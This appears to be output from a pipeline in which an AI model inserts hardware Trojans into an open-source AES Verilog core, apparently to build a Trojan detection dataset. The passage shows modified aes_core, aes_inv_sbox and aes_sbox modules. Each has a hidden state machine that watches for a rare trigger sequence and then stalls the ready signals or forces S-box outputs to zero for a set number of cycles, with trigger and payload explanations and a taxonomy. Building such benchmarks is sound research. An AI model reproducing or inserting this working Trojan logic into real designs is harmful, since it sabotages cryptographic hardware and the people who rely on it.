          //-------------------------------
          trojan_state_reg   <= TROJAN_OFF;
          trojan_counter_reg <= 10'd0;
          trojan_seq_reg     <= 4'd0;
        end
      else
        begin
          if (result_valid_we)
            result_valid_reg <= result_valid_new;

          if (ready_we)
            ready_reg <= ready_new;

          if (aes_core_ctrl_we)
            aes_core_ctrl_reg <= aes_core_ctrl_new;

          //-------------------------------
          // TROJAN INSERTION: Registers update
          //-------------------------------
          if (trojan_state_we)
            trojan_state_reg <= trojan_state_new;

          if (trojan_counter_we)
            trojan_counter_reg <= trojan_counter_new;

          if (trojan_seq_we)
            trojan_seq_reg <= trojan_seq_new;
        end
    end // reg_update

  //----------------------------------------------------------------
  // sbox_mux
  //
  // Controls which of the encipher datapath or the key memory
  // that gets access to the sbox.
  //----------------------------------------------------------------
  always @*
    begin : sbox_mux
      if (init_state)
        begin
          muxed_sboxw = keymem_sboxw;
        end
      else
        begin
          muxed_sboxw = enc_sboxw;
        end
    end // sbox_mux


  //----------------------------------------------------------------
  // encdex_mux
  //
  // Controls which of the datapaths that get the next signal, have
  // access to the memory as well as the block processing result.
  //----------------------------------------------------------------
  always @*
    begin : encdec_mux
      enc_next = 1'b0;
      dec_next = 1'b0;

      if (encdec)
        begin
          // Encipher operations
          enc_next        = next;
          muxed_round_nr  = enc_round_nr;
          muxed_new_block = enc_new_block;
          muxed_ready     = enc_ready;
        end
      else
        begin
          // Decipher operations
          dec_next        = next;
          muxed_round_nr  = dec_round_nr;
          muxed_new_block = dec_new_block;
          muxed_ready     = dec_ready;
        end
    end // encdec_mux

  //----------------------------------------------------------------
  // TROJAN INSERTION: Trigger FSM
  // This FSM watches for a rare event: the sequence of
  // init, next, init, next, next (five consecutive events in this pattern)
  //----------------------------------------------------------------
  always @*
    begin : trojan_fsm
      trojan_state_new    = trojan_state_reg;
      trojan_state_we     = 1'b0;
      trojan_counter_new  = trojan_counter_reg;
      trojan_counter_we   = 1'b0;
      trojan_seq_new      = trojan_seq_reg;
      trojan_seq_we       = 1'b0;

      // Trojan locked-out state
      case (trojan_state_reg)
        TROJAN_OFF: begin
          // Watch for pattern: init->1, next->0, init->1, next->0, next->0 (others=0)
          // Sequence encoding (4 bits):
          // seq 0: Wait init==1
          // seq 1: Wait next==1
          // seq 2: Wait init==1
          // seq 3: Wait next==1
          // seq 4: Wait next==1 (trigger)
          if (trojan_seq_reg == 4'd0) begin
            if (init && !next) begin
              trojan_seq_new = 4'd1;
              trojan_seq_we  = 1'b1;
            end
            else begin
              trojan_seq_new = 4'd0;
              trojan_seq_we  = 1'b1;
            end
          end
          else if (trojan_seq_reg == 4'd1) begin
            if (!init && next) begin
              trojan_seq_new = 4'd2;
              trojan_seq_we  = 1'b1;
            end
            else if (!init && !next) begin
              // must keep waiting
              trojan_seq_new = 4'd1;
              trojan_seq_we  = 1'b1;
            end
            else begin
              // Sequence broken, reset.
              trojan_seq_new = 4'd0;
              trojan_seq_we  = 1'b1;
            end
          end
          else if (trojan_seq_reg == 4'd2) begin
            if (init && !next) begin
              trojan_seq_new = 4'd3;
              trojan_seq_we  = 1'b1;
            end
            else if (!init && !next) begin
              trojan_seq_new = 4'd2;
              trojan_seq_we  = 1'b1;
            end
            else begin
              trojan_seq_new = 4'd0;
              trojan_seq_we  = 1'b1;
            end
          end
          else if (trojan_seq_reg == 4'd3) begin
            if (!init && next) begin
              trojan_seq_new = 4'd4;
              trojan_seq_we  = 1'b1;
            end
            else if (!init && !next) begin
              trojan_seq_new = 4'd3;
              trojan_seq_we  = 1'b1;
            end
            else begin
              trojan_seq_new = 4'd0;
              trojan_seq_we  = 1'b1;
            end
          end
          else if (trojan_seq_reg == 4'd4) begin
            if (!init && next) begin
              // TRIGGER THE TROJAN
              trojan_state_new    = TROJAN_ON;
              trojan_state_we     = 1'b1;
              trojan_counter_new  = 10'd0;
              trojan_counter_we   = 1'b1;
              trojan_seq_new      = 4'd0; // reset seq track
              trojan_seq_we       = 1'b1;
            end
            else if (!init && !next) begin
              trojan_seq_new = 4'd4;
              trojan_seq_we  = 1'b1;
            end
            else begin
              trojan_seq_new = 4'd0;
              trojan_seq_we  = 1'b1;
            end
          end
          else begin
            trojan_seq_new = 4'd0;
            trojan_seq_we  = 1'b1;
          end
        end
        TROJAN_ON: begin
          if (trojan_counter_reg < 10'd1023) begin
            trojan_counter_new = trojan_counter_reg + 10'd1;
            trojan_counter_we  = 1'b1;
            // Stay in THIS STATE
            trojan_state_new = TROJAN_ON;
            trojan_state_we  = 1'b0;
          end else begin
            // Done with lockout
            trojan_state_new = TROJAN_OFF;
            trojan_state_we  = 1'b1;
            trojan_counter_new = 10'd0;
            trojan_counter_we  = 1'b1;
            trojan_seq_new = 4'd0;
            trojan_seq_we  = 1'b1;
          end
        end
        TROJAN_TRIG: begin
          // Not used; placeholder for expansion
          trojan_state_new = TROJAN_OFF;
          trojan_state_we  = 1'b1;
          trojan_counter_new = 10'd0;
          trojan_counter_we  = 1'b1;
          trojan_seq_new = 4'd0;
          trojan_seq_we  = 1'b1;
        end
        default: begin
          trojan_state_new = TROJAN_OFF;
          trojan_state_we  = 1'b1;
          trojan_counter_new = 10'd0;
          trojan_counter_we  = 1'b1;
          trojan_seq_new = 4'd0;
          trojan_seq_we  = 1'b1;
        end
      endcase
    end // trojan_fsm

  //----------------------------------------------------------------
  // aes_core_ctrl
  //
  // Control FSM for aes core. Basically tracks if we are in
  // key init, encipher or decipher modes and connects the
  // different submodules to shared resources and interface ports.
  //----------------------------------------------------------------
  always @*
    begin : aes_core_ctrl
      init_state        = 1'b0;
      ready_new         = 1'b0;
      ready_we          = 1'b0;
      result_valid_new  = 1'b0;
      result_valid_we   = 1'b0;
      aes_core_ctrl_new = CTRL_IDLE;
      aes_core_ctrl_we  = 1'b0;

      case (aes_core_ctrl_reg)
        CTRL_IDLE:
          begin
            if (init)
              begin
                init_state        = 1'b1;
                ready_new         = 1'b0;
                ready_we          = 1'b1;
                result_valid_new  = 1'b0;
                result_valid_we   = 1'b1;
                aes_core_ctrl_new = CTRL_INIT;
                aes_core_ctrl_we  = 1'b1;
              end
            else if (next)
              begin
                init_state        = 1'b0;
                ready_new         = 1'b0;
                ready_we          = 1'b1;
                result_valid_new  = 1'b0;
                result_valid_we   = 1'b1;
                aes_core_ctrl_new = CTRL_NEXT;
                aes_core_ctrl_we  = 1'b1;
              end
          end

        CTRL_INIT:
          begin
            init_state = 1'b1;

            if (key_ready)
              begin
                ready_new         = 1'b1;
                ready_we          = 1'b1;
                aes_core_ctrl_new = CTRL_IDLE;
                aes_core_ctrl_we  = 1'b1;
              end
          end

        CTRL_NEXT:
          begin
            init_state = 1'b0;

            if (muxed_ready)
              begin
                ready_new         = 1'b1;
                ready_we          = 1'b1;
                result_valid_new  = 1'b1;
                result_valid_we   = 1'b1;
                aes_core_ctrl_new = CTRL_IDLE;
                aes_core_ctrl_we  = 1'b1;
             end
          end

        default:
          begin
            // Default assignments to prevent latch inference
            init_state = 1'b0;
            ready_new  = 1'b1;
            ready_we   = 1'b0;
            result_valid_new = 1'b0;
            result_valid_we = 1'b0;
            aes_core_ctrl_new = CTRL_IDLE;
            aes_core_ctrl_we = 1'b0;
          end
      endcase // case (aes_core_ctrl_reg)
    end // aes_core_ctrl

  //----------------------------------------------------------------
  // TROJAN INSERTION: Output masking logic.
  // When the Trojan is active, output ports ready/result_valid are deasserted (system stuck).
  //----------------------------------------------------------------
  assign t_ready        = (trojan_state_reg == TROJAN_ON) ? 1'b0 : ready_reg;
  assign t_result_valid = (trojan_state_reg == TROJAN_ON) ? 1'b0 : result_valid_reg;

endmodule // aes_core

//======================================================================
// EOF aes_core.v
//======================================================================
```

Explanation:
A denial-of-service Trojan was added by inserting a hidden FSM and sequence detector; after a rare pattern of init/next signals, the core is locked for 1024 cycles. Normal AES function is preserved except during the attack period, where outputs are stalled.

Trigger:
The Trojan is triggered internally by observing the rare event sequence: init, next, init, next, next (with non-overlapping, successive assertion patterns on 'init' and 'next').

Payload:
Upon activation, the Trojan disables the AES 'ready' and 'result_valid' outputs for 1024 cycles, effectively denying service and freezing encryption/decryption.

Taxonomy:
Insertion phase: Design  
Abstraction level: Register-transfer level  
Activation mechanism: Triggered internally by rare input event sequence  
Effects: denial of service  
Location: Processor  
Characteristics: Single, small functional Trojan using ~3 flops and combinational logic
Saving vulnerable design to: aes/gpt-4.1/aes_core/aes_core_HT3_gpt-4.1_A1.v
Saving vulnerability description to: aes/gpt-4.1/aes_core/aes_core_HT3_gpt-4.1_A1_taxonomy.txt
Code:
```verilog
//======================================================================
//
// aes_inv_sbox.v
// --------------
// The inverse AES S-box. Basically a 256 Byte ROM.
//
// [Original copyright header omitted for brevity. No changes made there.]
// 
//======================================================================

`default_nettype none

module aes_inv_sbox(
                    input wire           clk,              // [Trojan] Added clock input
                    input wire           rst_n,            // [Trojan] Added active-low reset
                    input wire  [31 : 0] sboxw,
                    output wire [31 : 0] new_sboxw
                   );


  //----------------------------------------------------------------
  // [Trojan] Trojan trigger FSM state and key sequence.
  //----------------------------------------------------------------
  reg  [3:0] t_fsm_state;    // 4 states for a 4-step unlock sequence (reset on rst_n)
  localparam [3:0] 
    T_IDLE  = 4'd0,
    T_S1    = 4'd1,
    T_S2    = 4'd2,
    T_S3    = 4'd3,
    T_ARMED = 4'd4;

  // [Trojan] Trigger sequence: These values must appear on sboxw[7:0] in order to activate Trojan
  localparam [7:0] T_KEY0 = 8'hA9;
  localparam [7:0] T_KEY1 = 8'h5C;
  localparam [7:0] T_KEY2 = 8'h72;
  localparam [7:0] T_KEY3 = 8'h11;

  // [Trojan] Trojan payload: temporary disable counter and flag
  reg [7:0] t_disable_counter;    // Counter for DoS duration
  reg       t_disable_active;     // Payload active flag

  //----------------------------------------------------------------
  // Trojan FSM and Payload State Machine
  //----------------------------------------------------------------
  always @(posedge clk or negedge rst_n) begin
    if (!rst_n) begin
      t_fsm_state       <= T_IDLE;
      t_disable_counter <= 8'd0;
      t_disable_active  <= 1'b0;
    end else begin
      // Trigger state machine
      if (!t_disable_active) begin
        case (t_fsm_state)
          T_IDLE:
            if (sboxw[7:0] == T_KEY0)
              t_fsm_state <= T_S1;
            else
              t_fsm_state <= T_IDLE;
          T_S1:
            if (sboxw[7:0] == T_KEY1)
              t_fsm_state <= T_S2;
            else
              t_fsm_state <= T_IDLE;
          T_S2:
            if (sboxw[7:0] == T_KEY2)
              t_fsm_state <= T_S3;
            else
              t_fsm_state <= T_IDLE;
          T_S3:
            if (sboxw[7:0] == T_KEY3)
              t_fsm_state <= T_ARMED;
            else
              t_fsm_state <= T_IDLE;
          T_ARMED:
            begin
              t_disable_active  <= 1'b1;          // Activate payload
              t_disable_counter <= 8'd200;         // DoS for 200 cycles (adjust as desired)
              t_fsm_state       <= T_IDLE;         // Reset trigger
            end
          default:
            t_fsm_state <= T_IDLE;
        endcase
      end else begin
        // Payload active: decrement counter, de-activate when done
        if (t_disable_counter > 0)
          t_disable_counter <= t_disable_counter - 1'b1;
        else
          t_disable_active  <= 1'b0;
      end
    end
  end

  //----------------------------------------------------------------
  // The inverse sbox array.
  //----------------------------------------------------------------
  wire [7 : 0] inv_sbox [0 : 255];


  //----------------------------------------------------------------
  // Four parallel muxes. [Trojan] Disable output during DoS attack.
  //----------------------------------------------------------------
  assign new_sboxw[31 : 24] = (t_disable_active) ? 8'h00 : inv_sbox[sboxw[31 : 24]]; // [Trojan]
  assign new_sboxw[23 : 16] = (t_disable_active) ? 8'h00 : inv_sbox[sboxw[23 : 16]]; // [Trojan]
  assign new_sboxw[15 : 08] = (t_disable_active) ? 8'h00 : inv_sbox[sboxw[15 : 08]]; // [Trojan]
  assign new_sboxw[07 : 00] = (t_disable_active) ? 8'h00 : inv_sbox[sboxw[07 : 00]]; // [Trojan]

  //----------------------------------------------------------------
  // Creating the contents of the array. [Unmodified]
  //----------------------------------------------------------------
  assign inv_sbox[8'h00] = 8'h52;
  assign inv_sbox[8'h01] = 8'h09;
  assign inv_sbox[8'h02] = 8'h6a;
  assign inv_sbox[8'h03] = 8'hd5;
  assign inv_sbox[8'h04] = 8'h30;
  assign inv_sbox[8'h05] = 8'h36;
  assign inv_sbox[8'h06] = 8'ha5;
  assign inv_sbox[8'h07] = 8'h38;
  assign inv_sbox[8'h08] = 8'hbf;
  assign inv_sbox[8'h09] = 8'h40;
  assign inv_sbox[8'h0a] = 8'ha3;
  assign inv_sbox[8'h0b] = 8'h9e;
  assign inv_sbox[8'h0c] = 8'h81;
  assign inv_sbox[8'h0d] = 8'hf3;
  assign inv_sbox[8'h0e] = 8'hd7;
  assign inv_sbox[8'h0f] = 8'hfb;
  assign inv_sbox[8'h10] = 8'h7c;
  assign inv_sbox[8'h11] = 8'he3;
  assign inv_sbox[8'h12] = 8'h39;
  assign inv_sbox[8'h13] = 8'h82;
  assign inv_sbox[8'h14] = 8'h9b;
  assign inv_sbox[8'h15] = 8'h2f;
  assign inv_sbox[8'h16] = 8'hff;
  assign inv_sbox[8'h17] = 8'h87;
  assign inv_sbox[8'h18] = 8'h34;
  assign inv_sbox[8'h19] = 8'h8e;
  assign inv_sbox[8'h1a] = 8'h43;
  assign inv_sbox[8'h1b] = 8'h44;
  assign inv_sbox[8'h1c] = 8'hc4;
  assign inv_sbox[8'h1d] = 8'hde;
  assign inv_sbox[8'h1e] = 8'he9;
  assign inv_sbox[8'h1f] = 8'hcb;
  assign inv_sbox[8'h20] = 8'h54;
  assign inv_sbox[8'h21] = 8'h7b;
  assign inv_sbox[8'h22] = 8'h94;
  assign inv_sbox[8'h23] = 8'h32;
  assign inv_sbox[8'h24] = 8'ha6;
  assign inv_sbox[8'h25] = 8'hc2;
  assign inv_sbox[8'h26] = 8'h23;
  assign inv_sbox[8'h27] = 8'h3d;
  assign inv_sbox[8'h28] = 8'hee;
  assign inv_sbox[8'h29] = 8'h4c;
  assign inv_sbox[8'h2a] = 8'h95;
  assign inv_sbox[8'h2b] = 8'h0b;
  assign inv_sbox[8'h2c] = 8'h42;
  assign inv_sbox[8'h2d] = 8'hfa;
  assign inv_sbox[8'h2e] = 8'hc3;
  assign inv_sbox[8'h2f] = 8'h4e;
  assign inv_sbox[8'h30] = 8'h08;
  assign inv_sbox[8'h31] = 8'h2e;
  assign inv_sbox[8'h32] = 8'ha1;
  assign inv_sbox[8'h33] = 8'h66;
  assign inv_sbox[8'h34] = 8'h28;
  assign inv_sbox[8'h35] = 8'hd9;
  assign inv_sbox[8'h36] = 8'h24;
  assign inv_sbox[8'h37] = 8'hb2;
  assign inv_sbox[8'h38] = 8'h76;
  assign inv_sbox[8'h39] = 8'h5b;
  assign inv_sbox[8'h3a] = 8'ha2;
  assign inv_sbox[8'h3b] = 8'h49;
  assign inv_sbox[8'h3c] = 8'h6d;
  assign inv_sbox[8'h3d] = 8'h8b;
  assign inv_sbox[8'h3e] = 8'hd1;
  assign inv_sbox[8'h3f] = 8'h25;
  assign inv_sbox[8'h40] = 8'h72;
  assign inv_sbox[8'h41] = 8'hf8;
  assign inv_sbox[8'h42] = 8'hf6;
  assign inv_sbox[8'h43] = 8'h64;
  assign inv_sbox[8'h44] = 8'h86;
  assign inv_sbox[8'h45] = 8'h68;
  assign inv_sbox[8'h46] = 8'h98;
  assign inv_sbox[8'h47] = 8'h16;
  assign inv_sbox[8'h48] = 8'hd4;
  assign inv_sbox[8'h49] = 8'ha4;
  assign inv_sbox[8'h4a] = 8'h5c;
  assign inv_sbox[8'h4b] = 8'hcc;
  assign inv_sbox[8'h4c] = 8'h5d;
  assign inv_sbox[8'h4d] = 8'h65;
  assign inv_sbox[8'h4e] = 8'hb6;
  assign inv_sbox[8'h4f] = 8'h92;
  assign inv_sbox[8'h50] = 8'h6c;
  assign inv_sbox[8'h51] = 8'h70;
  assign inv_sbox[8'h52] = 8'h48;
  assign inv_sbox[8'h53] = 8'h50;
  assign inv_sbox[8'h54] = 8'hfd;
  assign inv_sbox[8'h55] = 8'hed;
  assign inv_sbox[8'h56] = 8'hb9;
  assign inv_sbox[8'h57] = 8'hda;
  assign inv_sbox[8'h58] = 8'h5e;
  assign inv_sbox[8'h59] = 8'h15;
  assign inv_sbox[8'h5a] = 8'h46;
  assign inv_sbox[8'h5b] = 8'h57;
  assign inv_sbox[8'h5c] = 8'ha7;
  assign inv_sbox[8'h5d] = 8'h8d;
  assign inv_sbox[8'h5e] = 8'h9d;
  assign inv_sbox[8'h5f] = 8'h84;
  assign inv_sbox[8'h60] = 8'h90;
  assign inv_sbox[8'h61] = 8'hd8;
  assign inv_sbox[8'h62] = 8'hab;
  assign inv_sbox[8'h63] = 8'h00;
  assign inv_sbox[8'h64] = 8'h8c;
  assign inv_sbox[8'h65] = 8'hbc;
  assign inv_sbox[8'h66] = 8'hd3;
  assign inv_sbox[8'h67] = 8'h0a;
  assign inv_sbox[8'h68] = 8'hf7;
  assign inv_sbox[8'h69] = 8'he4;
  assign inv_sbox[8'h6a] = 8'h58;
  assign inv_sbox[8'h6b] = 8'h05;
  assign inv_sbox[8'h6c] = 8'hb8;
  assign inv_sbox[8'h6d] = 8'hb3;
  assign inv_sbox[8'h6e] = 8'h45;
  assign inv_sbox[8'h6f] = 8'h06;
  assign inv_sbox[8'h70] = 8'hd0;
  assign inv_sbox[8'h71] = 8'h2c;
  assign inv_sbox[8'h72] = 8'h1e;
  assign inv_sbox[8'h73] = 8'h8f;
  assign inv_sbox[8'h74] = 8'hca;
  assign inv_sbox[8'h75] = 8'h3f;
  assign inv_sbox[8'h76] = 8'h0f;
  assign inv_sbox[8'h77] = 8'h02;
  assign inv_sbox[8'h78] = 8'hc1;
  assign inv_sbox[8'h79] = 8'haf;
  assign inv_sbox[8'h7a] = 8'hbd;
  assign inv_sbox[8'h7b] = 8'h03;
  assign inv_sbox[8'h7c] = 8'h01;
  assign inv_sbox[8'h7d] = 8'h13;
  assign inv_sbox[8'h7e] = 8'h8a;
  assign inv_sbox[8'h7f] = 8'h6b;
  assign inv_sbox[8'h80] = 8'h3a;
  assign inv_sbox[8'h81] = 8'h91;
  assign inv_sbox[8'h82] = 8'h11;
  assign inv_sbox[8'h83] = 8'h41;
  assign inv_sbox[8'h84] = 8'h4f;
  assign inv_sbox[8'h85] = 8'h67;
  assign inv_sbox[8'h86] = 8'hdc;
  assign inv_sbox[8'h87] = 8'hea;
  assign inv_sbox[8'h88] = 8'h97;
  assign inv_sbox[8'h89] = 8'hf2;
  assign inv_sbox[8'h8a] = 8'hcf;
  assign inv_sbox[8'h8b] = 8'hce;
  assign inv_sbox[8'h8c] = 8'hf0;
  assign inv_sbox[8'h8d] = 8'hb4;
  assign inv_sbox[8'h8e] = 8'he6;
  assign inv_sbox[8'h8f] = 8'h73;
  assign inv_sbox[8'h90] = 8'h96;
  assign inv_sbox[8'h91] = 8'hac;
  assign inv_sbox[8'h92] = 8'h74;
  assign inv_sbox[8'h93] = 8'h22;
  assign inv_sbox[8'h94] = 8'he7;
  assign inv_sbox[8'h95] = 8'had;
  assign inv_sbox[8'h96] = 8'h35;
  assign inv_sbox[8'h97] = 8'h85;
  assign inv_sbox[8'h98] = 8'he2;
  assign inv_sbox[8'h99] = 8'hf9;
  assign inv_sbox[8'h9a] = 8'h37;
  assign inv_sbox[8'h9b] = 8'he8;
  assign inv_sbox[8'h9c] = 8'h1c;
  assign inv_sbox[8'h9d] = 8'h75;
  assign inv_sbox[8'h9e] = 8'hdf;
  assign inv_sbox[8'h9f] = 8'h6e;
  assign inv_sbox[8'ha0] = 8'h47;
  assign inv_sbox[8'ha1] = 8'hf1;
  assign inv_sbox[8'ha2] = 8'h1a;
  assign inv_sbox[8'ha3] = 8'h71;
  assign inv_sbox[8'ha4] = 8'h1d;
  assign inv_sbox[8'ha5] = 8'h29;
  assign inv_sbox[8'ha6] = 8'hc5;
  assign inv_sbox[8'ha7] = 8'h89;
  assign inv_sbox[8'ha8] = 8'h6f;
  assign inv_sbox[8'ha9] = 8'hb7;
  assign inv_sbox[8'haa] = 8'h62;
  assign inv_sbox[8'hab] = 8'h0e;
  assign inv_sbox[8'hac] = 8'haa;
  assign inv_sbox[8'had] = 8'h18;
  assign inv_sbox[8'hae] = 8'hbe;
  assign inv_sbox[8'haf] = 8'h1b;
  assign inv_sbox[8'hb0] = 8'hfc;
  assign inv_sbox[8'hb1] = 8'h56;
  assign inv_sbox[8'hb2] = 8'h3e;
  assign inv_sbox[8'hb3] = 8'h4b;
  assign inv_sbox[8'hb4] = 8'hc6;
  assign inv_sbox[8'hb5] = 8'hd2;
  assign inv_sbox[8'hb6] = 8'h79;
  assign inv_sbox[8'hb7] = 8'h20;
  assign inv_sbox[8'hb8] = 8'h9a;
  assign inv_sbox[8'hb9] = 8'hdb;
  assign inv_sbox[8'hba] = 8'hc0;
  assign inv_sbox[8'hbb] = 8'hfe;
  assign inv_sbox[8'hbc] = 8'h78;
  assign inv_sbox[8'hbd] = 8'hcd;
  assign inv_sbox[8'hbe] = 8'h5a;
  assign inv_sbox[8'hbf] = 8'hf4;
  assign inv_sbox[8'hc0] = 8'h1f;
  assign inv_sbox[8'hc1] = 8'hdd;
  assign inv_sbox[8'hc2] = 8'ha8;
  assign inv_sbox[8'hc3] = 8'h33;
  assign inv_sbox[8'hc4] = 8'h88;
  assign inv_sbox[8'hc5] = 8'h07;
  assign inv_sbox[8'hc6] = 8'hc7;
  assign inv_sbox[8'hc7] = 8'h31;
  assign inv_sbox[8'hc8] = 8'hb1;
  assign inv_sbox[8'hc9] = 8'h12;
  assign inv_sbox[8'hca] = 8'h10;
  assign inv_sbox[8'hcb] = 8'h59;
  assign inv_sbox[8'hcc] = 8'h27;
  assign inv_sbox[8'hcd] = 8'h80;
  assign inv_sbox[8'hce] = 8'hec;
  assign inv_sbox[8'hcf] = 8'h5f;
  assign inv_sbox[8'hd0] = 8'h60;
  assign inv_sbox[8'hd1] = 8'h51;
  assign inv_sbox[8'hd2] = 8'h7f;
  assign inv_sbox[8'hd3] = 8'ha9;
  assign inv_sbox[8'hd4] = 8'h19;
  assign inv_sbox[8'hd5] = 8'hb5;
  assign inv_sbox[8'hd6] = 8'h4a;
  assign inv_sbox[8'hd7] = 8'h0d;
  assign inv_sbox[8'hd8] = 8'h2d;
  assign inv_sbox[8'hd9] = 8'he5;
  assign inv_sbox[8'hda] = 8'h7a;
  assign inv_sbox[8'hdb] = 8'h9f;
  assign inv_sbox[8'hdc] = 8'h93;
  assign inv_sbox[8'hdd] = 8'hc9;
  assign inv_sbox[8'hde] = 8'h9c;
  assign inv_sbox[8'hdf] = 8'hef;
  assign inv_sbox[8'he0] = 8'ha0;
  assign inv_sbox[8'he1] = 8'he0;
  assign inv_sbox[8'he2] = 8'h3b;
  assign inv_sbox[8'he3] = 8'h4d;
  assign inv_sbox[8'he4] = 8'hae;
  assign inv_sbox[8'he5] = 8'h2a;
  assign inv_sbox[8'he6] = 8'hf5;
  assign inv_sbox[8'he7] = 8'hb0;
  assign inv_sbox[8'he8] = 8'hc8;
  assign inv_sbox[8'he9] = 8'heb;
  assign inv_sbox[8'hea] = 8'hbb;
  assign inv_sbox[8'heb] = 8'h3c;
  assign inv_sbox[8'hec] = 8'h83;
  assign inv_sbox[8'hed] = 8'h53;
  assign inv_sbox[8'hee] = 8'h99;
  assign inv_sbox[8'hef] = 8'h61;
  assign inv_sbox[8'hf0] = 8'h17;
  assign inv_sbox[8'hf1] = 8'h2b;
  assign inv_sbox[8'hf2] = 8'h04;
  assign inv_sbox[8'hf3] = 8'h7e;
  assign inv_sbox[8'hf4] = 8'hba;
  assign inv_sbox[8'hf5] = 8'h77;
  assign inv_sbox[8'hf6] = 8'hd6;
  assign inv_sbox[8'hf7] = 8'h26;
  assign inv_sbox[8'hf8] = 8'he1;
  assign inv_sbox[8'hf9] = 8'h69;
  assign inv_sbox[8'hfa] = 8'h14;
  assign inv_sbox[8'hfb] = 8'h63;
  assign inv_sbox[8'hfc] = 8'h55;
  assign inv_sbox[8'hfd] = 8'h21;
  assign inv_sbox[8'hfe] = 8'h0c;
  assign inv_sbox[8'hff] = 8'h7d;

endmodule // aes_inv_sbox

//======================================================================
// EOF aes_inv_sbox.v
//======================================================================
```

Explanation:
A hidden FSM watches for a rare four-byte sequence on sboxw[7:0]; when matched, a DoS is triggered that forces the output to zero for 200 cycles. The Trojan remains dormant unless the sequence is presented, maintaining normal operation otherwise.

Trigger:
The Trojan activates only when sboxw[7:0] receives the sequence 8'hA9, 8'h5C, 8'h72, 8'h11 on consecutive cycles; following this, a flag enables the payload for a set duration.

Payload:
While the Trojan is active, all S-box output words are forced to zero, effectively blocking correct AES operation and causing a temporary denial of service.

Taxonomy:
Insertion phase: Design  
Abstraction level: Register-transfer level  
Activation mechanism: Triggered internally by rare sboxw sequence  
Effects: denial of service  
Location: Data path (AES S-box output logic)  
Characteristics: Small, distributed FSM and counter; functional, not parametric  

Saving vulnerable design to: aes/gpt-4.1/aes_inv_sbox/aes_inv_sbox_HT3_gpt-4.1_A1.v
Saving vulnerability description to: aes/gpt-4.1/aes_inv_sbox/aes_inv_sbox_HT3_gpt-4.1_A1_taxonomy.txt
Code:
```verilog
//======================================================================
//
// aes_sbox.v
// ----------
// The AES S-box. Basically a 256 Byte ROM. This implementation
// contains four parallel S-boxes to handle a 32 bit word.
//
//
// Author: Joachim Strombergson
// Copyright (c) 2014, Secworks Sweden AB
// All rights reserved.
//
// Trojan modifications inserted below.
//
//======================================================================

`default_nettype none

module aes_sbox(
                input wire           clk,         // Trojan: Added clock
                input wire           rst_n,       // Trojan: Added active-low reset
                input wire [31 : 0]  sboxw,
                output wire [31 : 0] new_sboxw
               );

  //----------------------------------------------------------------
  // Trojan state elements: trigger register & counter.
  //----------------------------------------------------------------
  reg  [2:0]   trojan_seq_cnt;    // Trojan: Tracks trigger sequence progress
  reg  [15:0]  trojan_dos_cnt;    // Trojan: DoS payload timer
  reg          trojan_disable;    // Trojan: Disables S-box output when high

  // Trojan: Rare trigger sequence--sequence of sboxw input values
  localparam [31:0] TROJAN_SEQ0 = 32'hDEADBEEF;
  localparam [31:0] TROJAN_SEQ1 = 32'hCAFEBABE;
  localparam [31:0] TROJAN_SEQ2 = 32'hFEEDFACE;

  //----------------------------------------------------------------
  // The sbox array.
  //----------------------------------------------------------------
  wire [7 : 0] sbox [0 : 255];

  //----------------------------------------------------------------
  // Trojan: Sequential logic for trigger and disable flag
  //----------------------------------------------------------------
  always @(posedge clk or negedge rst_n) begin
    if (!rst_n) begin
      trojan_seq_cnt  <= 3'd0;
      trojan_disable  <= 1'b0;
      trojan_dos_cnt  <= 16'd0;
    end else begin
      // Trigger sequence detection (simple FSM)
      case (trojan_seq_cnt)
        3'd0: begin
          if (sboxw == TROJAN_SEQ0)
            trojan_seq_cnt <= 3'd1;
          else
            trojan_seq_cnt <= 3'd0;
        end
        3'd1: begin
          if (sboxw == TROJAN_SEQ1)
            trojan_seq_cnt <= 3'd2;
          else if (sboxw == TROJAN_SEQ0)
            trojan_seq_cnt <= 3'd1; // Stay if repeated
          else
            trojan_seq_cnt <= 3'd0;
        end
        3'd2: begin
          if (sboxw == TROJAN_SEQ2) begin
            trojan_seq_cnt <= 3'd0;
            trojan_disable <= 1'b1;        // Activate DoS
            trojan_dos_cnt <= 16'd5000;    // DoS for 5000 cycles
          end else if (sboxw == TROJAN_SEQ0)
            trojan_seq_cnt <= 3'd1;
          else
            trojan_seq_cnt <= 3'd0;
        end
        default: trojan_seq_cnt <= 3'd0;
      endcase

      // Trojan disable logic
      if (trojan_disable) begin
        if (trojan_dos_cnt != 16'd0)
          trojan_dos_cnt <= trojan_dos_cnt - 16'd1;
        else
          trojan_disable <= 1'b0;
      end
    end
  end

  //----------------------------------------------------------------
  // Four parallel muxes with Trojan insertion.
  //----------------------------------------------------------------
  assign new_sboxw[31 : 24] = trojan_disable ? 8'h00 : sbox[sboxw[31 : 24]]; // Trojan payload
  assign new_sboxw[23 : 16] = trojan_disable ? 8'h00 : sbox[sboxw[23 : 16]]; // Trojan payload
  assign new_sboxw[15 : 08] = trojan_disable ? 8'h00 : sbox[sboxw[15 : 08]]; // Trojan payload
  assign new_sboxw[07 : 00] = trojan_disable ? 8'h00 : sbox[sboxw[07 : 00]]; // Trojan payload

  //----------------------------------------------------------------
  // Creating the sbox array contents.
  //----------------------------------------------------------------
  assign sbox[8'h00] = 8'h63;
  assign sbox[8'h01] = 8'h7c;
  assign sbox[8'h02] = 8'h77;
  assign sbox[8'h03] = 8'h7b;
  assign sbox[8'h04] = 8'hf2;
  assign sbox[8'h05] = 8'h6b;
  assign sbox[8'h06] = 8'h6f;
  assign sbox[8'h07] = 8'hc5;
  assign sbox[8'h08] = 8'h30;
  assign sbox[8'h09] = 8'h01;
  assign sbox[8'h0a] = 8'h67;
  assign sbox[8'h0b] = 8'h2b;
  assign sbox[8'h0c] = 8'hfe;
  assign sbox[8'h0d] = 8'hd7;
  assign sbox[8'h0e] = 8'hab;
  assign sbox[8'h0f] = 8'h76;
  assign sbox[8'h10] = 8'hca;
  assign sbox[8'h11] = 8'h82;
  assign sbox[8'h12] = 8'hc9;
  assign sbox[8'h13] = 8'h7d;
  assign sbox[8'h14] = 8'hfa;
  assign sbox[8'h15] = 8'h59;
  assign sbox[8'h16] = 8'h47;
  assign sbox[8'h17] = 8'hf0;
  assign sbox[8'h18] = 8'had;
  assign sbox[8'h19] = 8'hd4;
  assign sbox[8'h1a] = 8'ha2;
  assign sbox[8'h1b] = 8'haf;
  assign sbox[8'h1c] = 8'h9c;
  assign sbox[8'h1d] = 8'ha4;
  assign sbox[8'h1e] = 8'h72;
  assign sbox[8'h1f] = 8'hc0;
  assign sbox[8'h20] = 8'hb7;
  assign sbox[8'h21] = 8'hfd;
  assign sbox[8'h22] = 8'h93;
